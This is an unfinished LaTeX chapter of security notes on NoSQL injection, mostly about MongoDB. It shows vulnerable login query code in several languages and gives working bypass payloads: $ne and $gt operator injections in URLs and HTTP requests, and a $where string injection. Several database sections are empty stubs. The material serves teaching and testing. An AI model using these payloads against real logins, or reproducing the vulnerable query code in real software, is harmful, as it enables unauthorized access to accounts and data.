\chapter{NoSQL injection}

\section{Introduction}
\url{https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection}
NoSQL databases provide looser consistency restrictions than traditional SQL
databases. By requiring fewer relational constraints and consistency checks,
NoSQL databases often offer performance and scaling benefits. Yet these
databases are still potentially vulnerable to injection attacks, even if they
arenâ€™t using the traditional SQL syntax. Because these NoSQL injection attacks
may execute within a procedural language, rather than in the declarative SQL
language, the potential impacts are greater than traditional SQL injection.


NoSQL injection attacks may execute in different areas of an application than
traditional SQL injection. Where SQL injection would execute within the
database engine, NoSQL variants may execute during within the application layer
or the database layer, depending on the NoSQL API used and data model.
Typically NoSQL injection attacks will execute where the attack string is
parsed, evaluated, or concatenated into a NoSQL API call.


\section{MongoDB}

\url{https://zanon.io/posts/nosql-injection-in-mongodb/}
\url{https://www.dailysecurity.fr/nosql-injections-classique-blind/}

The MongoDB API expects BSON (Binary JSON) calls, and includes a secure BSON
query assembly tool. However, according to MongoDB documentation - unserialized
JSON and JavaScript expressions are permitted in several alternative query
parameters.  The most commonly used API call allowing arbitrary JavaScript
input is the \verb+$where+ operator.

\url{https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf}

\subsection{Login bypass}

\begin{verbatim}
// NodeJS with Express.js
db.collection('users').find({
"user": req.query.user,
"password": req.query.password
});

// PHP
$collection->find(array(
'user' => $_GET['user'],
'password' => $_GET['password']
));
# Ruby on Rails
db['users'].find({
:user => req.params['user'],
:password => req.params['password']
})
# Python with Django
db.users.find({
"user": request.GET['user'],
"password": request.GET['password']
})
\end{verbatim}

\verb+https://example.org/login?user=patrick&password[%24ne]=+
or
\begin{verbatim}
POST /login HTTP/1.1
Host: example.org
Content-Type: application/json
Content-Length: 38
{'user': 'patrick', 'password': {'&gt': ''}}


POST /login HTTP/1.1
Host: example.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
user=Patrick&password[%24ne]=
\end{verbatim}



\subsection{\$where operator}

The MongoDB \verb+$where+ operator typically is used as a simple filter or
check, as it is within SQL.
\begin{verbatim}
db.myCollection.find( { $where: "this.credits == this.debits" } );
\end{verbatim}

Optionally JavaScript is also evaluated to allow more advanced conditions.


\begin{verbatim}
db.myCollection.find( { $where: function() { return obj.credits - obj.debits < 0; } } );
\end{verbatim}

Exemple of vulnerable code found in a login form.
\begin{verbatim}
    const username = req.body.username;
    const password = req.body.password;
    if (username === undefined || password === undefined) {
        res.status(400).send('Bad Request');
        return;
    }
    const passToTest = require('crypto').createHash('md5').update(password).digest('hex');
    const query = { $where: `this.username === '${username}' && this.password === '${passToTest}'` };
    const result = await User.find(query).maxTimeMS(350);
    if (result.length === 0) {
        res.redirect('/login?error=WrongCredentials');
    } else {
        req.session.username = req.body.username;
        req.session.save((error) => {
            if (error) {
                res.redirect('/login?error=WrongCredentials');
            } else {
                res.redirect('/admin');
            }
        });
    }
});
\end{verbatim}

this can be therefore bypassed with \verb+toto' || ' 1==1+

\section{redis}
\section{couchdb}
\section{memcached}

\section{tools}

\subsubsection{Metasploit}
\url{https://www.rapid7.com/blog/post/2014/06/12/you-have-no-sql-inj-sorry-nosql-injections-in-your-application/}

\subsubsection{nosqli}
\url{https://github.com/Charlie-belmer/nosqli}
\url{https://github.com/Charlie-belmer/nosqlilab}

\subsubsection{nosqlmap}

\subsubsection{burp}
\url{https://github.com/matrix/Burp-NoSQLiScanner/blob/main/src/burp/BurpExtender.java}

\section{links}

\begin{itemize}
    \item \href{https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf}{NoSQLi fun
        with objects and arrays}
    \item \href{https://media.blackhat.com/bh-us-11/Sullivan/BH_US_11_Sullivan_Server_Side_WP.pdf}{ServerSide JavaScript Injection: Attacking NoSQL and Node.js}
    \item \href{https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt}{nosqlinjection wordlists}
    \item \href{}{}
    \item \href{}{}
\end{itemize}
